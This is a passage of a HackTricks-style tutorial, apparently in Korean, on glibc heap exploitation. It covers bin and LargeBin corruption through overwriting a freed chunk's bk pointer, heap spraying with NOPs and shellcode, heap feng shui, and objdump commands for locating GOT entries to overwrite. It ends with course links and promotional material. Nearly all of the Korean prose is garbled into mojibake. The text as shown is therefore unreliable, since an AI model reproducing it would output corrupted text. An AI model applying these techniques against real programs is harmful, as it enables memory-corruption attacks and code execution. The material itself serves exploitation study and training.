ë‘ ê°œì˜ mallocì„ ì˜ˆì•½í•˜ì—¬ ì²« ë²ˆì§¸ê°€ ì˜¤ë²„í”Œë¡œìš°ëœ í›„ ë‘ ë²ˆì§¸ê°€ í•´ì œë˜ê³  binì— ë“¤ì–´ê°€ë„ë¡ í•©ë‹ˆë‹¤ (ì¦‰, ë‘ ë²ˆì§¸ ì¡°ê°ë³´ë‹¤ í° mallocì„ ì˜ˆì•½í•œ í›„ ì˜¤ë²„í”Œë¡œìš°ë¥¼ ìˆ˜í–‰í•´ì•¼ í•©ë‹ˆë‹¤).

ê³µê²©ìê°€ ì„ íƒí•œ ì£¼ì†Œë¥¼ ê°€ì§„ mallocì€ ê³µê²©ìê°€ ì œì–´í•´ì•¼ í•©ë‹ˆë‹¤.

ëª©í‘œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤. ë§Œì•½ ìš°ë¦¬ê°€ ì•„ë˜ì— í•´ì œëœ ì¡°ê°ì´ ìˆëŠ” í™ì— ì˜¤ë²„í”Œë¡œìš°ë¥¼ ìˆ˜í–‰í•  ìˆ˜ ìˆë‹¤ë©´, bk í¬ì¸í„°ë¥¼ ë³€ê²½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. bk í¬ì¸í„°ë¥¼ ë³€ê²½í•˜ê³  ì´ ì¡°ê°ì´ binì˜ ì²« ë²ˆì§¸ê°€ ë˜ë©´, mallocì´ ì´ ì¡°ê°ì˜ ë‹¤ìŒ ì¡°ê°ì´ ì˜ëª»ëœ ì£¼ì†Œì— ìˆë‹¤ê³  ë¯¿ê²Œ ë©ë‹ˆë‹¤ (ìŠ¤íƒì´ë‚˜ GOT ë“±). ë”°ë¼ì„œ ë‹¤ë¥¸ ì¡°ê°ì„ ë‹¤ì‹œ ì˜ˆì•½í•˜ë©´ ê³µê²©ìê°€ ì›í•˜ëŠ” ìœ„ì¹˜ì— ì¡°ê°ì„ í• ë‹¹ë°›ê³  ê·¸ê³³ì— ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ìˆ˜ì •ëœ ì¡°ê°ì„ í•´ì œí•œ í›„ì—ëŠ” í•´ì œëœ ì¡°ê°ë³´ë‹¤ í° ì¡°ê°ì„ ì˜ˆì•½í•´ì•¼ í•˜ë©°, ê·¸ë ‡ê²Œ í•˜ë©´ ìˆ˜ì •ëœ ì¡°ê°ì´ unsorted binsì—ì„œ ì œê±°ë˜ê³  ì ì ˆí•œ binì— ë“¤ì–´ê°€ê²Œ ë©ë‹ˆë‹¤.

binì— ë“¤ì–´ê°€ë©´ ì˜¤ë²„í”Œë¡œìš°ë¥¼ í†µí•´ bk í¬ì¸í„°ë¥¼ ìˆ˜ì •í•˜ì—¬ ìš°ë¦¬ê°€ ë®ì–´ì“°ê³ ì í•˜ëŠ” ì£¼ì†Œë¥¼ ê°€ë¦¬í‚¤ë„ë¡ í•©ë‹ˆë‹¤.

ë”°ë¼ì„œ binì€ malloc()ì´ ì¶©ë¶„íˆ í˜¸ì¶œë˜ì–´ ìˆ˜ì •ëœ binì´ ë‹¤ì‹œ ì‚¬ìš©ë  ë•Œê¹Œì§€ ëŒ€ê¸°í•´ì•¼ í•˜ë©°, ë‹¤ìŒ ì¡°ê°ì´ ì˜ëª»ëœ ì£¼ì†Œì— ìˆë‹¤ê³  ë¯¿ê²Œ ë©ë‹ˆë‹¤. ê·¸ í›„, ìš°ë¦¬ê°€ ì›í•˜ëŠ” ì¡°ê°ì´ ì œê³µë©ë‹ˆë‹¤.

ì·¨ì•½ì ì´ ê°€ëŠ¥í•œ í•œ ë¹¨ë¦¬ ì‹¤í–‰ë˜ë„ë¡ í•˜ë ¤ë©´ ì´ìƒì ì¸ ìˆœì„œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤: ì·¨ì•½í•œ ì¡°ê° ì˜ˆì•½, ìˆ˜ì •ë  ì¡°ê° ì˜ˆì•½, ì´ ì¡°ê° í•´ì œ, ìˆ˜ì •ë  ì¡°ê°ë³´ë‹¤ í° ì¡°ê° ì˜ˆì•½, ì¡°ê° ìˆ˜ì •(ì·¨ì•½ì ), ì·¨ì•½í•œ ì¡°ê°ê³¼ ê°™ì€ í¬ê¸°ì˜ ì¡°ê° ì˜ˆì•½, ë‘ ë²ˆì§¸ ì¡°ê° ì˜ˆì•½í•˜ì—¬ ì´ ì¡°ê°ì´ ì„ íƒí•œ ì£¼ì†Œë¥¼ ê°€ë¦¬í‚¤ê²Œ í•©ë‹ˆë‹¤.

ì´ ê³µê²©ì„ ë°©ì–´í•˜ê¸° ìœ„í•´ ì¼ë°˜ì ì¸ í™•ì¸ì´ ì‚¬ìš©ë˜ì—ˆìŠµë‹ˆë‹¤. ì¦‰, ì¡°ê°ì´ â€œê°€ì§œâ€ê°€ ì•„ë‹Œì§€ í™•ì¸í•©ë‹ˆë‹¤: bck->fdê°€ victimì„ ê°€ë¦¬í‚¤ê³  ìˆëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤. ì¦‰, ìš°ë¦¬ì˜ ê²½ìš° ìŠ¤íƒì—ì„œ ê°€ë¦¬í‚¤ëŠ” fd* í¬ì¸í„°ê°€ victimì„ ê°€ë¦¬í‚¤ê³  ìˆëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤. ì´ ë³´í˜¸ë¥¼ ìš°íšŒí•˜ê¸° ìœ„í•´ ê³µê²©ìëŠ” ì•„ë§ˆë„ ìŠ¤íƒì„ í†µí•´ ì ì ˆí•œ ì£¼ì†Œì— victimì˜ ì£¼ì†Œë¥¼ ì“¸ ìˆ˜ ìˆì–´ì•¼ í•©ë‹ˆë‹¤. ê·¸ë ‡ê²Œ í•˜ë©´ ì§„ì§œ ì¡°ê°ì²˜ëŸ¼ ë³´ì´ê²Œ ë©ë‹ˆë‹¤.

**LargeBin ì†ìƒ**

ì´ì „ê³¼ ë™ì¼í•œ ìš”êµ¬ ì‚¬í•­ì´ í•„ìš”í•˜ë©°, ì¶”ê°€ë¡œ ì˜ˆì•½ëœ ì¡°ê°ì€ 512ë³´ë‹¤ ì»¤ì•¼ í•©ë‹ˆë‹¤.

ê³µê²©ì€ ì´ì „ê³¼ ìœ ì‚¬í•˜ë©°, bk í¬ì¸í„°ë¥¼ ìˆ˜ì •í•´ì•¼ í•˜ë©°, ëª¨ë“  malloc() í˜¸ì¶œì´ í•„ìš”í•˜ì§€ë§Œ, ìˆ˜ì •ëœ ì¡°ê°ì˜ sizeë¥¼ size - nbê°€ < MINSIZEê°€ ë˜ë„ë¡ ìˆ˜ì •í•´ì•¼ í•©ë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´ sizeë¥¼ 1552ë¡œ ì„¤ì •í•˜ë©´ 1552 - 1544 = 8 < MINSIZEê°€ ë©ë‹ˆë‹¤ (ëº„ì…ˆì´ ìŒìˆ˜ê°€ ë  ìˆ˜ëŠ” ì—†ìŠµë‹ˆë‹¤. unsignedë¥¼ ë¹„êµí•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤).

ë˜í•œ ì´ë¥¼ ë”ìš± ë³µì¡í•˜ê²Œ ë§Œë“¤ê¸° ìœ„í•´ íŒ¨ì¹˜ê°€ ë„ì…ë˜ì—ˆìŠµë‹ˆë‹¤.

**í™ ìŠ¤í”„ë ˆì´**

ê¸°ë³¸ì ìœ¼ë¡œ ê°€ëŠ¥í•œ ëª¨ë“  ë©”ëª¨ë¦¬ë¥¼ ì˜ˆì•½í•˜ê³  ì´ë¥¼ nopsë¡œ ì±„ìš´ í›„ shellcodeë¡œ ì±„ìš°ëŠ” ê²ƒì…ë‹ˆë‹¤. ë˜í•œ, 0x0cë¡œ íŒ¨ë”©ì„ ì‚¬ìš©í•©ë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ 0x0c0c0c0c ì£¼ì†Œë¡œ ì í”„í•˜ë ¤ê³  ì‹œë„í•˜ë©°, ì´ ì£¼ì†Œê°€ ë®ì–´ì“°ì—¬ì§€ë©´ ê·¸ê³³ìœ¼ë¡œ ì í”„í•˜ê²Œ ë©ë‹ˆë‹¤. ê¸°ë³¸ì ìœ¼ë¡œ ì „ëµì€ ê°€ëŠ¥í•œ í•œ ë§ì´ ì˜ˆì•½í•˜ì—¬ í¬ì¸í„°ê°€ ë®ì–´ì“°ì—¬ì§€ëŠ”ì§€ í™•ì¸í•˜ê³  0x0c0c0c0cë¡œ ì í”„í•˜ì—¬ ê·¸ê³³ì— nopsê°€ ìˆê¸°ë¥¼ ê¸°ëŒ€í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

**í™ í‘ í›„ì´**

ì˜ˆì•½ ë° í•´ì œë¥¼ í†µí•´ ë©”ëª¨ë¦¬ë¥¼ ì¡°ì‘í•˜ì—¬ ììœ  ì¡°ê° ì‚¬ì´ì— ì˜ˆì•½ëœ ì¡°ê°ì´ ìˆë„ë¡ í•©ë‹ˆë‹¤. ì˜¤ë²„í”Œë¡œìš°í•  ë²„í¼ëŠ” ì´ëŸ¬í•œ ì¡°ê° ì¤‘ í•˜ë‚˜ì— ìœ„ì¹˜í•˜ê²Œ ë©ë‹ˆë‹¤.

**objdump -d ì‹¤í–‰íŒŒì¼** â€”> í•¨ìˆ˜ ë””ìŠ¤ì–´ì…ˆë¸”\
**objdump -d ./í”„ë¡œê·¸ë¨ | grep í•¨ìˆ˜** â€”> í•¨ìˆ˜ ì£¼ì†Œ ê°€ì ¸ì˜¤ê¸°\
**objdump -d -Mintel ./shellcodeout** â€”> ì‹¤ì œë¡œ ìš°ë¦¬ì˜ shellcodeì¸ì§€ í™•ì¸í•˜ê³  OpCodesë¥¼ ì¶”ì¶œí•˜ê¸° ìœ„í•´\
**objdump -t ./exec | grep varBss** â€”> ì‹¬ë³¼ í…Œì´ë¸”, ë³€ìˆ˜ ë° í•¨ìˆ˜ ì£¼ì†Œ ì¶”ì¶œ\
**objdump -TR ./exec | grep exit(func lib)** â€”> ë¼ì´ë¸ŒëŸ¬ë¦¬ í•¨ìˆ˜ ì£¼ì†Œ ì¶”ì¶œ (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** â€”> GOTì—ì„œ ë®ì–´ì“¸ puts ì£¼ì†Œ ì¶”ì¶œ\
**objdump -D ./exec** â€”> ëª¨ë“  ê²ƒì„ ë””ìŠ¤ì–´ì…ˆë¸”í•˜ì—¬ plt í•­ëª©ê¹Œì§€\
**objdump -p -/exec**\
**Info functions strncmp â€”>** gdbì—ì„œ í•¨ìˆ˜ ì •ë³´

## í¥ë¯¸ë¡œìš´ ê³¼ì •

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **ì°¸ê³  ë¬¸í—Œ**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê³  ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê³  ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter**ì—ì„œ **íŒ”ë¡œìš°**í•˜ì„¸ìš” ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **HackTricks** ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.

</details>
{% endhint %}
